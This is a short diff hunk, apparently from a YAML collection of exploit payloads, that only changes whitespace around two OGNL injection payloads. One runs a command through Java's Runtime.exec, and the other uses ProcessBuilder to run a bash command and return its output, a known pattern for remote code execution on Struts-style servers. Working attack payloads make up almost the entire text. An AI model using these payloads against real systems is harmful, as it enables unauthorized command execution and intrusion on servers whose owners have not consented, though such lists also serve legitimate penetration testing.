@@ -45,7 +45,6 @@ tricks:
     payload: |
       # Runtime.exec (no output)
       %{@java.lang.Runtime@getRuntime().exec('touch /tmp/pwned')}
-      
+
       # ProcessBuilder (with output)
       %{(#cmd='whoami')(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd}))(#p.redirectErrorStream(true))(#process=#p.start())(new java.util.Scanner(#process.getInputStream()).useDelimiter('\\Z').next())}
-
